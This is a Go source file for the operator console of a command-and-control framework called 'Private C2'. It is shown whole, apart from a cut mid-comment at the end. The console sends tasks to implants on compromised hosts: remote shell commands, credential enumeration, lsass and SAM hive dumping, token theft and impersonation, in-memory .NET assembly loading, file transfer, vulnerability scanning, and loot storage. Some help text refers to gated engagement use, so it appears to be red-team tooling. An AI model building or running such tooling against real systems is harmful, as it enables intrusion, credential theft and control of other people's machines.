package main

import (
	"bufio"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/azizbinmohammad/private-c2/client/api"
)

// ANSI color helpers
const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorCyan   = "\033[36m"
	colorBold   = "\033[1m"
	colorDim    = "\033[2m"
)

// Session represents a remote implant session.
type Session struct {
	ID          string `json:"id"`
	Hostname    string `json:"hostname"`
	Username    string `json:"username"`
	OS          string `json:"os"`
	Arch        string `json:"arch"`
	RemoteAddr  string `json:"remote_addr"`
	LastCheckin string `json:"last_checkin"`
	CreatedAt   string `json:"created_at"`
}

// TaskRequest is the body sent to create a new task. The server forwards only
// type and args to the implant, so bulk payloads (uploads) ride inside Args.
type TaskRequest struct {
	Type string `json:"type"`
	Args string `json:"args,omitempty"`
}

// TaskResponse is the response from creating a task.
type TaskResponse struct {
	TaskID string `json:"task_id"`
}

// TaskResult is the response from polling a task.
type TaskResult struct {
	TaskID  string `json:"task_id"`
	Status  string `json:"status"`
	Success bool   `json:"success"`
	Output  string `json:"output"`
	Error   string `json:"error"`
}

// ScanRequest mirrors the implant's nmap.Request. Target, profile and ports
// travel as JSON so none can be mistaken for another, or for an nmap option.
type ScanRequest struct {
	Target  string `json:"target"`
	Profile string `json:"profile,omitempty"`
	Ports   string `json:"ports,omitempty"`
}

// ScanResult mirrors the implant's nmap.Result, which arrives inside the task's
// Output field as JSON.
type ScanResult struct {
	Target   string        `json:"target"`
	Profile  string        `json:"profile"`
	Ports    string        `json:"ports"`
	Elapsed  string        `json:"elapsed"`
	Hosts    []ScanHost    `json:"hosts"`
	Services []ScanService `json:"services"`
	Findings []ScanFinding `json:"findings"`
	Partial  bool          `json:"partial"`
	Notice   string        `json:"notice"`
	Raw      string        `json:"raw"`
}

// ScanHost is one host the scan reported on.
type ScanHost struct {
	Address  string `json:"address"`
	Hostname string `json:"hostname"`
	State    string `json:"state"`
}

// ScanService is one port, with whatever version detail the profile gathered.
type ScanService struct {
	Host      string `json:"host"`
	Port      int    `json:"port"`
	Protocol  string `json:"protocol"`
	State     string `json:"state"`
	Name      string `json:"name"`
	Product   string `json:"product"`
	Version   string `json:"version"`
	ExtraInfo string `json:"extra_info"`
	CPE       string `json:"cpe"`
}

// ScanFinding is one NSE script result. There is no severity: nmap's XML
// carries none, so Vulnerable records only what the script's own output stated
// and CVEs lists the identifiers it actually named.
type ScanFinding struct {
	Host       string   `json:"host"`
	Port       int      `json:"port"`
	Protocol   string   `json:"protocol"`
	ScriptID   string   `json:"script_id"`
	Vulnerable bool     `json:"vulnerable"`
	CVEs       []string `json:"cves"`
	Output     string   `json:"output"`
}

func main() {
	serverAddr := flag.String("server", "http://127.0.0.1:8080", "Server HTTP API address")
	username := flag.String("username", "admin", "Operator username")
	password := flag.String("password", "admin", "Operator password")
	attach := flag.String("session", "", "session ID prefix to attach to on startup (optional)")
	flag.Parse()

	printBanner()

	client := api.New(*serverAddr)
	if err := client.Login(*username, *password); err != nil {
		printError(fmt.Sprintf("Authentication failed: %v", err))
		printInfo("Check --server, --username and --password.")
		os.Exit(1)
	}
	printSuccess(fmt.Sprintf("Authenticated to %s as %s", client.BaseURL(), *username))

	var activeSession *Session
	// --session lets a launcher drop the operator straight into the implant it
	// just started, instead of making them read an ID off another log and type
	// it back in. cmdUse reports its own errors, so an unknown or ambiguous
	// prefix just leaves the console unattached rather than failing startup.
	if *attach != "" {
		activeSession = cmdUse(client, *attach)
	}

	scanner := bufio.NewScanner(os.Stdin)
	// Increase scanner buffer for large outputs
	scanner.Buffer(make([]byte, 0, 1024*1024), 1024*1024)

	for {
		printPrompt(activeSession)

		if !scanner.Scan() {
			// EOF (Ctrl+D)
			fmt.Println()
			printInfo("Goodbye.")
			break
		}

		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := splitArgs(line)
		cmd := strings.ToLower(parts[0])
		args := parts[1:]

		switch cmd {
		case "exit", "quit":
			printInfo("Goodbye.")
			return

		case "help":
			printHelp()

		case "sessions":
			cmdSessions(client)

		case "ls":
			// "ls" with no active session lists sessions; with active session sends ls task
			if activeSession == nil {
				if len(args) == 0 {
					cmdSessions(client)
				} else {
					printError("No active session. Use 'use <id>' first.")
				}
			} else {
				path := "."
				if len(args) > 0 {
					path = strings.Join(args, " ")
				}
				cmdTask(client, activeSession.ID, "ls", path)
			}

		case "use", "interact":
			if len(args) < 1 {
				printError("Usage: use <session-id-prefix>")
				continue
			}
			activeSession = cmdUse(client, args[0])

		case "info":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdInfo(client, activeSession.ID)

		case "shell":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: shell <command>")
				continue
			}
			cmdTask(client, activeSession.ID, "shell", strings.Join(args, " "))

		case "!":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: ! <command>")
				continue
			}
			cmdTask(client, activeSession.ID, "shell", strings.Join(args, " "))

		case "pwd":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "pwd", "")

		case "cd":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: cd <path>")
				continue
			}
			cmdTask(client, activeSession.ID, "cd", strings.Join(args, " "))

		case "ps":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "ps", "")

		case "psinfo":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "process_info", "")

		case "suspend", "resume":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError(fmt.Sprintf("Usage: %s <pid>", cmd))
				continue
			}
			taskType := "process_suspend"
			if cmd == "resume" {
				taskType = "process_resume"
			}
			cmdTask(client, activeSession.ID, taskType, args[0])

		case "getprivs":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "getprivs", "")

		case "creds":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "credential_enum", "")

		case "credread":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: credread <path>")
				continue
			}
			cmdTask(client, activeSession.ID, "credential_read", args[0])

		case "assembly":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: assembly <local-dll-or-exe> [args...]")
				continue
			}
			data, err := os.ReadFile(args[0])
			if err != nil {
				printError(fmt.Sprintf("Failed to read assembly: %v", err))
				continue
			}
			req := map[string]any{"assembly": base64.StdEncoding.EncodeToString(data)}
			if len(args) > 1 {
				req["arguments"] = args[1:]
			}
			payload, _ := json.Marshal(req)
			cmdTask(client, activeSession.ID, "execute_assembly", string(payload))

		case "loot":
			if len(args) < 1 {
				printError("Usage: loot <list|add|get|download|rm> [args]")
				continue
			}
			cmdLoot(client, args)

		case "dump":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: dump <lsass|sam|security|system>")
				continue
			}
			cmdTask(client, activeSession.ID, "credential_dump", args[0])

		case "tokens":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "token_list", "")

		case "steal":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: steal <pid>")
				continue
			}
			cmdTask(client, activeSession.ID, "token_steal", args[0])

		case "maketoken":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 2 {
				printError("Usage: maketoken <username> <password> [domain]")
				continue
			}
			req := map[string]string{"username": args[0], "password": args[1]}
			if len(args) >= 3 {
				req["domain"] = args[2]
			}
			data, _ := json.Marshal(req)
			cmdTask(client, activeSession.ID, "token_make", string(data))

		case "impersonate":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: impersonate <token-id>")
				continue
			}
			cmdTask(client, activeSession.ID, "token_impersonate", args[0])

		case "revert":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			cmdTask(client, activeSession.ID, "token_revert", "")

		case "cat":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: cat <file>")
				continue
			}
			cmdTask(client, activeSession.ID, "cat", strings.Join(args, " "))

		case "upload":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 2 {
				printError("Usage: upload <local-path> <remote-path>")
				continue
			}
			cmdUpload(client, activeSession.ID, args[0], args[1])

		case "download":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: download <remote-path> [local-path]")
				continue
			}
			localPath := ""
			if len(args) >= 2 {
				localPath = args[1]
			}
			cmdDownload(client, activeSession.ID, args[0], localPath)

		case "nmap":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			// Unlike the commands above, no arguments is meaningful: it asks the
			// target whether nmap is installed there.
			cmdTask(client, activeSession.ID, "nmap", strings.Join(args, " "))

		case "scan":
			if activeSession == nil {
				printError("No active session. Use 'use <id>' first.")
				continue
			}
			if len(args) < 1 {
				printError("Usage: scan <target> [--quick|--services|--vulns]")
				continue
			}
			cmdScan(client, activeSession.ID, args)

		case "back":
			if activeSession != nil {
				printInfo("Session deselected.")
				activeSession = nil
			} else {
				printWarning("No active session.")
			}

		default:
			// Handle "! cmd" when typed as "!cmd" (no space)
			if strings.HasPrefix(cmd, "!") && len(cmd) > 1 {
				if activeSession == nil {
					printError("No active session. Use 'use <id>' first.")
					continue
				}
				fullCmd := cmd[1:] + " " + strings.Join(args, " ")
				cmdTask(client, activeSession.ID, "shell", strings.TrimSpace(fullCmd))
			} else {
				printError(fmt.Sprintf("Unknown command: %s. Type 'help' for available commands.", cmd))
			}
		}
	}
}

// splitArgs splits a command line into arguments, respecting quoted strings.
func splitArgs(line string) []string {
	var args []string
	var current strings.Builder
	inQuote := false
	quoteChar := byte(0)

	for i := 0; i < len(line); i++ {
		c := line[i]
		if inQuote {
			if c == quoteChar {
				inQuote = false
			} else {
				current.WriteByte(c)
			}
		} else {
			if c == '"' || c == '\'' {
				inQuote = true
				quoteChar = c
			} else if c == ' ' || c == '\t' {
				if current.Len() > 0 {
					args = append(args, current.String())
					current.Reset()
				}
			} else {
				current.WriteByte(c)
			}
		}
	}
	if current.Len() > 0 {
		args = append(args, current.String())
	}
	return args
}

func printBanner() {
	fmt.Printf(`
%s%s  ____       _            _            ____ ____  %s
%s%s |  _ \ _ __(_)_   ____ _| |_ ___     / ___|___ \ %s
%s%s | |_) | '__| \ \ / / _  | __/ _ \   | |     __) |%s
%s%s |  __/| |  | |\ V / (_| | ||  __/   | |___ / __/ %s
%s%s |_|   |_|  |_| \_/ \__,_|\__\___|    \____|_____|%s
`,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
		colorBold, colorCyan, colorReset,
	)
	fmt.Printf("  %sPrivate C2 Framework — Operator Console%s\n", colorDim, colorReset)
	fmt.Printf("  %sType 'help' for available commands.%s\n\n", colorDim, colorReset)
}

func printPrompt(session *Session) {
	if session != nil {
		short := session.ID
		if len(short) > 8 {
			short = short[:8]
		}
		fmt.Printf("%s%spc2%s [%s%s%s] > ", colorBold, colorCyan, colorReset, colorYellow, short, colorReset)
	} else {
		fmt.Printf("%s%spc2%s > ", colorBold, colorCyan, colorReset)
	}
}

func printError(msg string) {
	fmt.Printf("%s[!] %s%s\n", colorRed, msg, colorReset)
}

func printSuccess(msg string) {
	fmt.Printf("%s[+] %s%s\n", colorGreen, msg, colorReset)
}

func printInfo(msg string) {
	fmt.Printf("%s[*] %s%s\n", colorCyan, msg, colorReset)
}

func printWarning(msg string) {
	fmt.Printf("%s[!] %s%s\n", colorYellow, msg, colorReset)
}

func printHelp() {
	fmt.Printf("\n%s%sAvailable Commands:%s\n\n", colorBold, colorCyan, colorReset)
	helpEntries := []struct{ cmd, desc string }{
		{"sessions, ls", "List all active sessions"},
		{"use <id>", "Select a session by ID prefix (min 4 chars)"},
		{"interact <id>", "Alias for 'use'"},
		{"info", "Show full details of the active session"},
		{"back", "Deselect the active session"},
		{"", ""},
		{"shell <cmd>", "Execute a shell command on the target"},
		{"! <cmd>", "Shorthand for 'shell <cmd>'"},
		{"ls [path]", "List directory contents (with active session)"},
		{"pwd", "Print working directory on target"},
		{"cd <path>", "Change directory on target"},
		{"ps", "List running processes on target"},
		{"psinfo", "Structured process list (JSON: PID, PPID, user, cmdline, RSS)"},
		{"suspend <pid>", "Suspend a process (engagement privilege capability)"},
		{"resume <pid>", "Resume a suspended process"},
		{"getprivs", "List the implant's privileges (Windows) or capabilities (Linux)"},
		{"creds", "Enumerate credential-bearing files and environment variables (gated)"},
		{"credread <path>", "Read one credential file named by the operator (gated)"},
		{"dump <kind>", "Dump lsass or a SAM/SECURITY/SYSTEM hive on Windows (gated)"},
		{"loot list|add <task>|get <id>|download <id>|rm <id>", "Manage engagement loot on the server"},
		{"assembly <file> [args...]", "Load a .NET assembly in PowerShell on Windows"},
		{"tokens", "List the current and stored tokens"},
		{"steal <pid>", "Duplicate a process token and store it"},
		{"maketoken <user> <pass> [domain]", "Log on with credentials and store the token"},
		{"impersonate <id>", "Verify a stored token on a locked thread, then revert"},
		{"revert", "Close all stored token handles"},
		{"cat <file>", "Read file contents on target"},
		{"upload <local> <remote>", "Upload a local file to the target"},
		{"download <remote> [local]", "Download a file from the target"},
		{"nmap [target] [opts]", "Run nmap on the target (no args = check nmap is installed)"},
		{"scan <target> [opts]", "Scan a target: services and vulnerabilities (--quick|--services|--vulns, --ports 80,443)"},
		{"", ""},
		{"help", "Show this help message"},
		{"exit, quit", "Exit the console"},
	}
	for _, e := range helpEntries {
		if e.cmd == "" {
			fmt.Println()
			continue
		}
		fmt.Printf("  %s%-28s%s %s\n", colorGreen, e.cmd, colorReset, e.desc)
	}
	fmt.Println()
}

// relativeTime returns a human-friendly relative time string.
func relativeTime(ts string) string {
	t, err := time.Parse(time.RFC3339, ts)
	if err != nil {
		// Try RFC3339Nano
		t, err = time.Parse(time.RFC3339Nano, ts)
		if err != nil {
			return ts
		}
	}
	d := time.Since(t)
	if d < 0 {
		return "just now"
	}
	switch {
	case d < time.Minute:
		s := int(d.Seconds())
		if s <= 1 {
			return "1s ago"
		}
		return fmt.Sprintf("%ds ago", s)
	case d < time.Hour:
		m := int(d.Minutes())
		if m == 1 {
			return "1m ago"
		}
		return fmt.Sprintf("%dm ago", m)
	case d < 24*time.Hour:
		h := int(d.Hours())
		if h == 1 {
			return "1h ago"
		}
		return fmt.Sprintf("%dh ago", h)
	default:
		days := int(d.Hours() / 24)
		if days == 1 {
			return "1d ago"
		}
		return fmt.Sprintf("%dd ago", days)
	}
}

// cmdSessions fetches and displays all sessions.
func cmdSessions(client *api.Client) {
	var sessions []Session
	if err := client.Get("/api/sessions", &sessions); err != nil {
		printError(fmt.Sprintf("Failed to list sessions: %v", err))
		return
	}

	if len(sessions) == 0 {
		printWarning("No active sessions.")
		return
	}

	// Table header
	fmt.Printf("\n%s%-10s %-14s %-10s %-12s %-22s %-12s%s\n",
		colorCyan,
		"ID", "Hostname", "User", "OS/Arch", "Remote Addr", "Last Seen",
		colorReset,
	)
	fmt.Printf("%s%s%s\n", colorDim, strings.Repeat("-", 82), colorReset)

	for _, s := range sessions {
		shortID := s.ID
		if len(shortID) > 8 {
			shortID = shortID[:8]
		}
		osArch := s.OS + "/" + s.Arch
		fmt.Printf("%-10s %-14s %-10s %-12s %-22s %-12s\n",
			shortID, truncate(s.Hostname, 14), truncate(s.Username, 10),
			truncate(osArch, 12), truncate(s.RemoteAddr, 22),
			relativeTime(s.LastCheckin),
		)
	}
	fmt.Println()
}

// truncate shortens a string to maxLen, appending "..." if needed.
func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	if maxLen <= 3 {
		return s[:maxLen]
	}
	return s[:maxLen-3] + "..."
}

// cmdUse selects a session by ID prefix.
func cmdUse(client *api.Client, prefix string) *Session {
	if len(prefix) < 4 {
		printError("Session ID prefix must be at least 4 characters.")
		return nil
	}

	var sessions []Session
	if err := client.Get("/api/sessions", &sessions); err != nil {
		printError(fmt.Sprintf("Failed to list sessions: %v", err))
		return nil
	}

	prefix = strings.ToLower(prefix)
	var matches []Session
	for _, s := range sessions {
		if strings.HasPrefix(strings.ToLower(s.ID), prefix) {
			matches = append(matches, s)
		}
	}

	switch len(matches) {
	case 0:
		printError(fmt.Sprintf("No session matching prefix '%s'.", prefix))
		return nil
	case 1:
		s := &matches[0]
		short := s.ID
		if len(short) > 8 {
			short = short[:8]
		}
		printSuccess(fmt.Sprintf("Active session: %s (%s@%s)", short, s.Username, s.Hostname))
		return s
	default:
		printError(fmt.Sprintf("Ambiguous prefix '%s' matches %d sessions. Be more specific.", prefix, len(matches)))
		for _, s := range matches {
			short := s.ID
			if len(short) > 8 {
				short = short[:8]
			}
			fmt.Printf("  %s %s@%s\n", short, s.Username, s.Hostname)
		}
		return nil
	}
}

// cmdInfo displays detailed information about the active session.
func cmdInfo(client *api.Client, sessionID string) {
	var s Session
	if err := client.Get("/api/sessions/"+sessionID, &s); err != nil {
		printError(fmt.Sprintf("Failed to get session info: %v", err))
		return
	}

	fmt.Printf("\n%s%sSession Details%s\n", colorBold, colorCyan, colorReset)
	fmt.Printf("%s%s%s\n", colorDim, strings.Repeat("-", 40), colorReset)
	fmt.Printf("  %sID:%s          %s\n", colorCyan, colorReset, s.ID)
	fmt.Printf("  %sHostname:%s    %s\n", colorCyan, colorReset, s.Hostname)
	fmt.Printf("  %sUsername:%s    %s\n", colorCyan, colorReset, s.Username)
	fmt.Printf("  %sOS:%s          %s\n", colorCyan, colorReset, s.OS)
	fmt.Printf("  %sArch:%s        %s\n", colorCyan, colorReset, s.Arch)
	fmt.Printf("  %sRemote Addr:%s %s\n", colorCyan, colorReset, s.RemoteAddr)
	fmt.Printf("  %sLast Checkin:%s %s (%s)\n", colorCyan, colorReset, s.LastCheckin, relativeTime(s.LastCheckin))
	fmt.Printf("  %sCreated:%s     %s\n", colorCyan, colorReset, s.CreatedAt)
	fmt.Println()
}

// taskPollInterval is how often cmdTask/cmdDownload check for a finished task.
const taskPollInterval = 500 * time.Millisecond

// taskPollTimeout bounds how long the console waits for a task result.
const taskPollTimeout = 30 * time.Second

// nmapPollTimeout bounds the wait for a scan, which takes far longer than the
// other tasks. It has to outlast the implant's own nmap timeout
// (implant/modules/nmap.DefaultTimeout) plus a beacon interval on either side --
// the scan runs inline in the implant's beacon loop, so the result only comes
// back on the checkin after it finishes.
const nmapPollTimeout = 5 * time.Minute

// scanPollTimeout bounds the wait for a structured scan. It has to outlast the
// longest scan profile -- "vulns" gets 7 minutes in implant/modules/nmap, which
// itself is sized around nmap's 4-minute --host-timeout plus the script phase --
// and then allow a beacon interval on either side, since the scan runs inline in
// the implant's beacon loop and its result only returns on the checkin after it
// finishes.
const scanPollTimeout = 9 * time.Minute

// taskPollTimeoutFor returns how long to wait for a task of the given type.
// Only the two scan types get a long window; every other task keeps the short
// one, so a hung shell command still reports promptly.
func taskPollTimeoutFor(taskType string) time.Duration {
	switch taskType {
	case "nmap":
		return nmapPollTimeout
	case "scan":
		return scanPollTimeout
	default:
		return taskPollTimeout
	}
}

// isTaskPending reports whether a task result represents an unfinished task.
//
// The server answers GET /api/tasks/{id} with {"status":"pending"} while the
// task is still queued, and with the bare result object (no "status" field)
// once it has completed. The web portal relies on the same contract (see
// pollResult() in webui/index.html), so this must stay a "not pending means
// done" test rather than looking for an explicit "completed" status.
func isTaskPending(result *TaskResult) bool {
	return result.Status == "pending"
}

// cmdTask submits a task and polls until completion, then renders its output.
// LootArtifact mirrors the server's metadata response (the blob path is not
// serialized).
type LootArtifact struct {
	ID           string `json:"id"`
	EngagementID string `json:"engagement_id"`
	SessionID    string `json:"session_id,omitempty"`
	TaskID       string `json:"task_id,omitempty"`
	Operator     string `json:"operator"`
	Kind         string `json:"kind"`
	Name         string `json:"name"`
	Size         int64  `json:"size"`
	SHA256       string `json:"sha256"`
	Note         string `json:"note,omitempty"`
	CreatedAt    string `json:"created_at"`
}

func cmdLoot(client *api.Client, args []string) {
	switch args[0] {
	case "list", "ls":
		var artifacts []LootArtifact
		if err := client.Get("/api/loot", &artifacts); err != nil {
			printError(fmt.Sprintf("Failed to list loot: %v", err))
			return
		}
		if len(artifacts) == 0 {
			printInfo("No loot stored.")
			return
		}
		fmt.Printf("%-38s %-12s %-24s %10s  %s\n", "ID", "KIND", "NAME", "SIZE", "SHA256")
		for _, a := range artifacts {
			fmt.Printf("%-38s %-12s %-24s %10d  %.12s\n", a.ID, a.Kind, a.Name, a.Size, a.SHA256)
		}

	case "add":
		if len(args) < 2 {
			printError("Usage: loot add <task-id> [name]")
			return
		}
		body := map[string]string{"task_id": args[1], "kind": "task"}
		if len(args) >= 3 {
			body["name"] = args[2]
		}
		var artifact LootArtifact
		if err := client.Post("/api/loot", body, &artifact); err != nil {
			printError(fmt.Sprintf("Failed to store loot: %v", err))
			return
		}
		printInfo(fmt.Sprintf("Stored loot %s (%s, %d bytes)", artifact.ID, artifact.Name, artifact.Size))

	case "get":
		if len(args) < 2 {
			printError("Usage: loot get <id>")
			return
		}
		var artifact LootArtifact
		if err := client.Get("/api/loot/"+args[1], &artifact); err != nil {
			printError(fmt.Sprintf("Failed to get loot: %v", err))
			return
		}
		data, _ := json.MarshalIndent(artifact, "", "  ")
		fmt.Println(string(data))

	case "download":
		if len(args) < 2 {
			printError("Usage: loot download <id> [local-path]")
			return
		}
		dest := ""
		if len(args) >= 3 {
			dest = args[2]
		} else {
			var artifact LootArtifact
			if err := client.Get("/api/loot/"+args[1], &artifact); err == nil {
				dest = artifact.Name
			}
			if dest == "" || dest == "." {
				dest = args[1] + ".bin"
			}
		}
		data, err := client.GetBytes("/api/loot/" + args[1] + "/download")
		if err != nil {
			printError(fmt.Sprintf("Failed to download loot: %v", err))
			return
		}
		if err := os.WriteFile(dest, data, 0600); err != nil {
			printError(fmt.Sprintf("Failed to write %s: %v", dest, err))
			return
		}
		printInfo(fmt.Sprintf("Wrote %d bytes to %s", len(data), dest))

	case "rm", "delete":
		if len(args) < 2 {
			printError("Usage: loot rm <id>")
			return
		}
		if err := client.Delete("/api/loot/"+args[1], nil); err != nil {
			printError(fmt.Sprintf("Failed to delete loot: %v", err))
			return
		}
		printInfo("Loot deleted.")

	default:
		printError("Usage: loot <list|add|get|download|rm> [args]")
	}
}

func cmdTask(client *api.Client, sessionID string, taskType string, taskArgs string) {
	result, ok := submitAndPoll(client, sessionID, taskType, taskArgs)
	if !ok {
		return
	}
	renderTaskResult(result)
}

// submitAndPoll queues a task and waits for its result, so callers that render
// the raw output differently (see cmdScan) can share the submit/poll path.
// It returns ok=false when the task could not be queued or did not finish in
// time; in both cases the error has already been printed.
func submitAndPoll(client *api.Client, sessionID string, taskType string, taskArgs string) (*TaskResult, bool) {
	req := TaskRequest{
		Type: taskType,
		Args: taskArgs,
	}

	var resp TaskResponse
	if err := client.Post("/api/sessions/"+sessionID+"/task", req, &resp); err != nil {
		printError(fmt.Sprintf("Failed to submit task: %v", err))
		return nil, false
	}

	printInfo(fmt.Sprintf("Task submitted: %s", resp.TaskID))

	return pollTask(client, resp.TaskID, taskPollTimeoutFor(taskType))
}

// pollTask polls /api/tasks/{id} until the task finishes or the timeout
// elapses. It returns ok=false when the caller should not render a result.
func pollTask(client *api.Client, taskID string, timeout time.Duration) (*TaskResult, bool) {
	deadline := time.After(timeout)
	ticker := time.NewTicker(taskPollInterval)
	defer ticker.Stop()

	for {
		select {
		case <-deadline:
			printWarning(fmt.Sprintf("Task timed out after %s. It may still be running on the target.", timeout))
			printInfo(fmt.Sprintf("Check later with task ID: %s", taskID))
			return nil, false
		case <-ticker.C:
			var result TaskResult
			if err := client.Get("/api/tasks/"+taskID, &result); err != nil {
				printError(fmt.Sprintf("Failed to poll task: %v", err))
				return nil, false
			}
			if isTaskPending(&result) {
				continue
			}
			return &result, true
		}
	}
}

// renderTaskResult prints a finished task's outcome for the plain commands.
//
// Output is printed before the failure is reported, not after an early return:
// a task that errors can still have produced useful output, and dropping it
// loses the most valuable part of the result. A scan that hits the implant's
// timeout is the clearest case -- the ports it found are in that output.
func renderTaskResult(result *TaskResult) {
	if result.Output != "" {
		fmt.Print(result.Output)
		if !strings.HasSuffix(result.Output, "\n") {
			fmt.Println()
		}
	}
	if !result.Success {
		printError(fmt.Sprintf("Task failed: %s", result.Error))
		return
	}
	if result.Output == "" {
		printSuccess("Task completed (no output).")
	}
}

// scanProfileNames maps the CLI's profile flags onto the implant's names.
var scanProfileNames = map[string]string{
	"--quick":    "quick",
	"-q":         "quick",
	"--services": "services",
	"-s":         "services",
	"--vulns":    "vulns",
	"-v":         "vulns",
}

// scanOptions is the parsed form of
// "scan <target> [--quick|--services|--vulns] [--ports <list>]".
type scanOptions struct {
	Target  string
	Profile string
	Ports   string
}

// parseScanArgs splits the scan command's arguments. An empty profile is left
// empty so the implant applies its own default rather than the console deciding
// what the default scan is.
func parseScanArgs(args []string) (scanOptions, error) {
	var opts scanOptions

	for i := 0; i < len(args); i++ {
		a := args[i]

		if name, ok := scanProfileNames[a]; ok {
			if opts.Profile != "" && opts.Profile != name {
				return scanOptions{}, fmt.Errorf("pick one scan profile, not both %s and %s", opts.Profile, name)
			}
			opts.Profile = name
			continue
		}

		if a == "--ports" || a == "-p" {
			if i+1 >= len(args) {
				return scanOptions{}, fmt.Errorf("%s needs a port list, e.g. %s 80,443", a, a)
			}
			i++
			opts.Ports = args[i]
			continue
		}

		if strings.HasPrefix(a, "-") {
			return scanOptions{}, fmt.Errorf("unknown scan option %q", a)
		}
		if opts.Target != "" {
			return scanOptions{}, fmt.Errorf("scan takes one target, got %q and %q", opts.Target, a)
		}
		opts.Target = a
	}

	if opts.Target == "" {
		return scanOptions{}, fmt.Errorf("scan needs a target")
	}
	return opts, nil
}

// cmdScan runs the structured scanner and renders services and findings as
// tables, rather than dumping the task output the way cmdTask would.
func cmdScan(client *api.Client, sessionID string, args []string) {
	opts, err := parseScanArgs(args)
	if err != nil {
		printError(err.Error())
		printInfo("Usage: scan <target> [--quick|--services|--vulns] [--ports 80,443]")
		return
	}

	// NSE vulnerability scripts actively probe the service they test and can
	// crash or wedge it, so say so before running them rather than after.
	if opts.Profile == "vulns" {
		printWarning("The vulns profile runs nmap's vulnerability scripts; those actively probe the target and can disrupt the service being tested.")
	}

	payload, err := json.Marshal(ScanRequest{Target: opts.Target, Profile: opts.Profile, Ports: opts.Ports})
	if err != nil {
		printError(fmt.Sprintf("Failed to encode scan request: %v", err))
		return
	}

	result, ok := submitAndPoll(client, sessionID, "scan", string(payload))
	if !ok {
		return
	}
	renderScanResult(result)
}

// renderScanResult renders a structured scan.
//
// The scan task returns its JSON even when it failed, because a scan cut short
// at its deadline still found what it found. So the JSON is rendered first and
// the failure reported afterwards, rather than discarding the findings.
func renderScanResult(result *TaskResult) {
	var scan ScanResult
	if result.Output == "" || json.Unmarshal([]byte(result.Output), &scan) != nil {
		// Not a structured result (an older implant, or a non-scan task).
		// Fall back to the generic renderer so nothing is lost.
		renderTaskResult(result)
		return
	}

	printScanResult(&scan)

	if !result.Success {
		printError(fmt.Sprintf("Task failed: %s", result.Error))
	}
}

func printScanResult(scan *ScanResult) {
	header := fmt.Sprintf("Scan of %s", scan.Target)
	if scan.Profile != "" {
		header += " (" + scan.Profile + ")"
	}
	if scan.Ports != "" {
		header += " ports " + scan.Ports
	}
	if scan.Elapsed != "" {
		header += " -- " + scan.Elapsed + "s"
	}
	fmt.Printf("\n%s%s%s\n", colorBold, header, colorReset)

	// When nmap's XML could not be parsed there is nothing structured to show,
	// and printing an empty result would look like a scan that found nothing.
	if len(scan.Services) == 0 && len(scan.Findings) == 0 && scan.Raw != "" {
		printWarning(scan.Notice)
		fmt.Print(truncateRaw(scan.Raw))
		return
	}

	printServiceTable(scan.Services)
	printFindings(scan.Findings)

	if scan.Notice != "" {
		printWarning(scan.Notice)
	}
}

func printServiceTable(services []ScanService) {
	fmt.Printf("\n%sSERVICES (%d)%s\n", colorCyan, len(services), colorReset)
	if len(services) == 0 {
		printInfo("No ports reported.")
		return
	}

	fmt.Printf("%s  %-10s %-9s %-16s %s%s\n", colorDim, "PORT", "STATE", "SERVICE", "VERSION", colorReset)
	for _, s := range services {
		// Closed ports are listed too, so "checked and nothing there" stays
		// distinguishable from "never checked".
		line := fmt.Sprintf("  %-10s %-9s %-16s %s",
			fmt.Sprintf("%d/%s", s.Port, s.Protocol), s.State, truncate(s.Name, 16), serviceVersion(&s))
		if s.State == "open" {
			fmt.Printf("%s%s%s\n", colorGreen, line, colorReset)
		} else {
			fmt.Printf("%s%s%s\n", colorDim, line, colorReset)
		}
	}
}

// rawOutputLimit caps how much unparsed nmap output is printed.
//
// Raw output only appears when nothing could be decoded, and that happens most
